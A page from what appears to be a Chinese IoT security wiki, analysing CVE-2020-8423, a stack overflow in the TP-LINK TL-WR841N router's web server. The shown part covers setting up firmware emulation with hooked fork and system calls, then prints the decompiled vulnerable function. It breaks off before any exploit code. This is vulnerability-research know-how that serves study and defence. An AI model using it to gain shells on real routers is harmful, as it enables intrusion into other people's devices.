@@ -1,0 +1,1465 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="HatLab_IOT_Wiki">
+      
+      
+        <link rel="canonical" href="https://dassecurity-labs.github.io/HatLab_IOT_Wiki/TPLINK_WR841N%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+      
+      
+        <meta name="author" content="HatLab Team members">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
+    
+    
+      
+        <title>TPLINK WR841N路由器漏洞分析 - HatLab_IOT_Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.adb8469c.css">
+      
+        <link rel="stylesheet" href="../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#03a9f4">
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.86422ebf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="light-blue" data-md-color-accent="deep-orange">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#0x00" tabindex="0" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://dassecurity-labs.github.io/HatLab_IOT_Wiki/" title="HatLab_IOT_Wiki" aria-label="HatLab_IOT_Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">cloud</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              HatLab_IOT_Wiki
+            </span>
+            <span class="md-header-nav__topic">
+              
+                TPLINK WR841N路由器漏洞分析
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" aria-label="search" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+<nav class="md-tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href=".." class="md-tabs__link">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../wireless_security/bluetooth_security/base_intro/Class_of_Device/" class="md-tabs__link">
+          无线电安全
+        </a>
+      
+    </li>
+  
+
+  
+
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../firmware_security/" class="md-tabs__link">
+          固件安全
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../hardware_security/" class="md-tabs__link">
+          硬件安全
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../tools_lib/" class="md-tabs__link">
+          工具库
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://dassecurity-labs.github.io/HatLab_IOT_Wiki/" title="HatLab_IOT_Wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon">cloud</i>
+      
+    </a>
+    HatLab_IOT_Wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href=".." title="基本介绍/Intro" class="md-nav__link">
+      基本介绍/Intro
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../summary/" title="内容概述/Summary" class="md-nav__link">
+      内容概述/Summary
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../about/" title="关于我们/About" class="md-nav__link">
+      关于我们/About
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      无线电安全
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        无线电安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1">
+    
+    <label class="md-nav__link" for="nav-2-1">
+      蓝牙安全
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        蓝牙安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1">
+    
+    <label class="md-nav__link" for="nav-2-1-1">
+      基础攻防知识
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-1">
+        基础攻防知识
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../wireless_security/bluetooth_security/base_intro/Class_of_Device/" title="Class of Device" class="md-nav__link">
+      Class of Device
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../wireless_security/bluetooth_security/base_intro/Active_Scanning_vs_Passive_Scanning/" title="Active Scanning vs. Passive Scanning" class="md-nav__link">
+      Active Scanning vs. Passive Scanning
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-2" type="checkbox" id="nav-2-1-2">
+    
+    <label class="md-nav__link" for="nav-2-1-2">
+      漏洞分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-2">
+        漏洞分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="/root/github/HatLab_IOT_Wiki/docs/wireless_security/bluetooth_security/vuln_analyse/CVE-2017-0785.md" title="BlueBorne 之 CVE-2017-0785 原理分析" class="md-nav__link">
+      BlueBorne 之 CVE-2017-0785 原理分析
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      固件安全
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        固件安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/" title="概述" class="md-nav__link">
+      概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/firmware_sort/" title="固件分类" class="md-nav__link">
+      固件分类
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
+    
+    <label class="md-nav__link" for="nav-3-3">
+      固件获取
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        固件获取
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/firmware_obtain/" title="概述" class="md-nav__link">
+      概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/firmware_obtain/website_download/" title="官网下载" class="md-nav__link">
+      官网下载
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/firmware_obtain/update_captrue/" title="更新抓包获取" class="md-nav__link">
+      更新抓包获取
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
+    
+    <label class="md-nav__link" for="nav-3-4">
+      IOT 设备指令集特点
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-4">
+        IOT 设备指令集特点
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/IOT_instructions_charac/found_danger_func/" title="敏感函数定位技巧" class="md-nav__link">
+      敏感函数定位技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/IOT_instructions_charac/stackoverflow_exploit/" title="栈溢出利用技巧" class="md-nav__link">
+      栈溢出利用技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/IOT_instructions_charac/MIPS_shellcode/" title="MIPS shellcode 指令编写技巧" class="md-nav__link">
+      MIPS shellcode 指令编写技巧
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
+    
+    <label class="md-nav__link" for="nav-3-5">
+      环境搭建
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-5">
+        环境搭建
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/environment_building/Mips_fuzzing_environment_building/" title="MIPS fuzzing 环境搭建" class="md-nav__link">
+      MIPS fuzzing 环境搭建
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
+    
+    <label class="md-nav__link" for="nav-3-6">
+      漏洞分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-6">
+        漏洞分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/vuln_analyse/TL_WR841n_vuln_analyse/" title="TPLINK_WR841N 路由器漏洞分析" class="md-nav__link">
+      TPLINK_WR841N 路由器漏洞分析
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
+    
+    <label class="md-nav__link" for="nav-3-7">
+      总结性文章
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-7">
+        总结性文章
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../firmware_security/summary_article/string_vulnerability/" title="C 语言中字符分割有关的函数与常见字符串复制溢出点" class="md-nav__link">
+      C 语言中字符分割有关的函数与常见字符串复制溢出点
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      硬件安全
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        硬件安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../hardware_security/" title="概述" class="md-nav__link">
+      概述
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      工具库
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        工具库
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_lib/" title="概述" class="md-nav__link">
+      概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_lib/firmware_tools/" title="固件安全工具" class="md-nav__link">
+      固件安全工具
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00" class="md-nav__link">
+    0x00 简介
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01" class="md-nav__link">
+    0x01 环境搭建
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    0x02 漏洞分析
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03" class="md-nav__link">
+    0x03 漏洞验证
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x04" class="md-nav__link">
+    0x04 漏洞利用
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mipsrop-rop" class="md-nav__link">
+    使用 mipsrop 插件查找 ROP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" class="md-nav__link">
+    shellcode 查找/构造
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>TPLINK WR841N路由器漏洞分析</h1>
+                
+                <h2 id="0x00">0x00 简介<a class="headerlink" href="#0x00" title="Permanent link">&para;</a></h2>
+<p>前段时间 TP-LINK TL-WR841N 设备爆出了一个认证后的栈溢出漏洞，借机复现了一下这个栈溢出漏洞，其中有一些在漏洞利用上的小技巧在此和大家分享一下。</p>
+<p>漏洞信息如下：</p>
+<blockquote>
+<p>漏洞编号：CVE-2020-8423</p>
+<p>漏洞设备：TP-LINK TL-WR841N V10</p>
+<p>漏洞效果：登陆过路由器web服务admin账户之后可以获取到路由器的shell。</p>
+<p>漏洞描述：httpd获取参数时的栈溢出导致了覆盖返回地址shellcode执行</p>
+</blockquote>
+<p>受影响设备以及版本信息：</p>
+<div class="codehilite"><pre><span></span><code>cpe：2.3：o：tp-link：tl-wr841n_firmware：3.16.9：*：*：*：*：*：*：*
+cpe：2.3：h：tp-link：tl-wr841n：v10：*：*：*：*：*：*：*
+</code></pre></div>
+
+<h2 id="0x01">0x01 环境搭建<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>下载固件：<a href="https://www.tp-link.com/no/support/download/tl-wr841n/v10/">https://www.tp-link.com/no/support/download/tl-wr841n/v10/</a></p>
+</li>
+<li>
+<p><code>binwalk -Me xxx.bin</code>命令对固件进行解压。</p>
+</li>
+<li>
+<p>关于一些依赖环境的搭建和网络配置可以参考下面的链接： <a href="https://blog.csdn.net/qq_38204481/article/details/105391866">https://blog.csdn.net/qq_38204481/article/details/105391866</a></p>
+</li>
+<li>
+<p>为了成功运行环境，必须hook 一些关键函数。编译hook函数，hook掉httpd文件里面的阻塞函数。</p>
+</li>
+</ol>
+<p>参考文章中，实际上只需要hook 掉fork和system函数：</p>
+<div class="codehilite"><pre><span></span><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+
+int system(const char *command){
+    printf(&quot;HOOK: system(\&quot;%s\&quot;)&quot;,command);
+    return 1337;
+}
+
+
+int fork(void){
+    return 1337;
+}
+</code></pre></div>
+
+<p>编译：</p>
+<div class="codehilite"><pre><span></span><code>mips-linux-gnu-gcc -shared -fPIC hook_mips.c -o hook_mips
+</code></pre></div>
+
+<ol>
+<li>运行 qemu 环境</li>
+</ol>
+<p>启动 qemu 虚拟机之后，在里面运行，便成功启动调试环境。</p>
+<div class="codehilite"><pre><span></span><code>mount --bind /proc squashfs-root/proc
+chroot . bin/sh
+
+<span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&quot;/hook&quot;</span> /usr/bin/httpd
+或者
+<span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&quot;/hook&quot;</span>
+./gdbserver <span class="m">0</span>.0.0.0:2333  /usr/bin/httpd
+</code></pre></div>
+
+<ul>
+<li>
+<p>这里可能会出现一些报错：如没有 libc.so.6 或者 没有ld.so.1，解决方法是需要创建 lib 目录下对应的软连接，<code>ln -s ld-uClibc-0.9.30.so ld.so.1</code>，如图</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20200408190632763.png" /></p>
+<p>搭建成功之后访问IP地址即可</p>
+<p>如果是远程，没有界面可以使用ssh端口转发
+ <a href="https://blog.csdn.net/qq_38204481/article/details/105113896">https://blog.csdn.net/qq_38204481/article/details/105113896</a></p>
+</li>
+</ul>
+<h2 id="0x02">0x02 漏洞分析<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
+<p>得到文件系统之后，在 <code>/usr/bin/httpd</code> 二进制文件中，找到了这个函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">stringModify</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">src</span><span class="p">)</span>
+
+<span class="p">{</span>
+       <span class="kt">char</span> <span class="n">src_index</span><span class="p">;</span>
+       <span class="kt">char</span> <span class="o">*</span><span class="n">src_index_a_1</span><span class="p">;</span>
+       <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+       <span class="k">if</span> <span class="p">((</span><span class="n">dest</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">src_index_a_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">src</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">src</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> 
+<span class="p">{</span>
+              <span class="n">index</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+       <span class="p">}</span>
+
+       <span class="k">else</span> <span class="p">{</span>
+              <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+              <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
+                     <span class="n">src_index</span> <span class="o">=</span> <span class="n">src_index_a_1</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+
+                     <span class="k">if</span> <span class="p">((</span><span class="n">src_index</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;=</span> <span class="n">index</span><span class="p">))</span> <span class="k">break</span><span class="p">;</span><span class="cm">/* src为空或当index等于长度时结束 */</span>
+                     <span class="k">if</span> <span class="p">(</span><span class="n">src_index</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">//处理 /  </span>
+                     <span class="nl">LAB_0043bb48</span><span class="p">:</span>
+                           <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="sc">&#39;\\&#39;</span><span class="p">;</span>
+                     <span class="nl">LAB_0043bb4c</span><span class="p">:</span>
+                           <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+                           <span class="n">dest</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span><span class="cm">/*  /添加转义字符，变为\/ */</span>
+                     <span class="nl">LAB_0043bb54</span><span class="p">:</span>
+                           <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="n">src_index_a_1</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+                           <span class="n">dest</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+                     <span class="p">}</span>
+                     <span class="k">else</span> <span class="p">{</span>                     <span class="c1">//处理其他字符</span>
+                           <span class="k">if</span> <span class="p">(</span><span class="sc">&#39;/&#39;</span> <span class="o">&lt;</span> <span class="n">src_index</span><span class="p">)</span> <span class="p">{</span><span class="c1">//左斜杠为2F小于0的ascii  （处理数字和字母）</span>
+                                  <span class="k">if</span> <span class="p">((</span><span class="n">src_index</span> <span class="o">==</span> <span class="sc">&#39;&gt;&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">src_index</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span><span class="p">))</span> 
+<span class="k">goto</span> <span class="n">LAB_0043bb48</span><span class="p">;</span>
+                                  <span class="k">if</span> <span class="p">(</span><span class="n">src_index</span> <span class="o">==</span> <span class="sc">&#39;&lt;&#39;</span><span class="p">)</span> <span class="p">{</span>
+
+                                         <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="sc">&#39;\\&#39;</span><span class="p">;</span>
+                                         <span class="k">goto</span> <span class="n">LAB_0043bb4c</span><span class="p">;</span>  <span class="c1">//&gt;，&lt;，\\变为  </span>
+<span class="err">\</span><span class="o">&gt;&gt;</span><span class="p">,</span><span class="err">\</span><span class="o">&lt;&lt;</span><span class="p">,</span><span class="err">\</span><span class="c1">//</span>
+                                  <span class="p">}</span>
+                                  <span class="k">goto</span> <span class="n">LAB_0043bb54</span><span class="p">;</span>
+                           <span class="p">}</span>  <span class="c1">//下面是ascii小于x2f的字符</span>
+
+                           <span class="k">if</span> <span class="p">(</span><span class="n">src_index</span> <span class="o">!=</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span> <span class="p">{</span><span class="c1">//\r的ascii为DH                       （处理\r,\&quot;,\n）</span>
+                                  <span class="k">if</span> <span class="p">(</span><span class="n">src_index</span> <span class="o">==</span> <span class="sc">&#39;\&quot;&#39;</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_0043bb48</span><span class="p">;</span><span class="c1">//22h</span>
+
+                                  <span class="k">if</span> <span class="p">(</span><span class="n">src_index</span> <span class="o">!=</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_0043bb54</span><span class="p">;</span><span class="c1">//AH</span>
+                           <span class="p">}</span>
+
+                           <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">src_index_a_1</span> <span class="o">!=</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="n">src_index_a_1</span> <span class="o">!=</span> 
+<span class="sc">&#39;\n&#39;</span><span class="p">))</span> <span class="p">{</span><span class="c1">//处理前一个为\r或\n  后一个不是\r或\n 的组合字符  </span>
+                                  <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="sc">&#39;&lt;&#39;</span><span class="p">;</span>    <span class="c1">// &lt;br&gt;</span>
+                                  <span class="n">dest</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;b&#39;</span><span class="p">;</span>
+                                  <span class="n">dest</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;r&#39;</span><span class="p">;</span>
+                                  <span class="n">dest</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;&gt;&#39;</span><span class="p">;</span>
+                                  <span class="n">dest</span> <span class="o">=</span> <span class="n">dest</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
+                           <span class="p">}</span>
+                     <span class="p">}</span>   <span class="c1">//else结束</span>
+                     <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span><span class="c1">//index表示已经拷贝的长度（包含转义字符\）</span>
+                     <span class="n">src_index_a_1</span> <span class="o">=</span> <span class="n">src_index_a_1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+              <span class="p">}</span>
+              <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
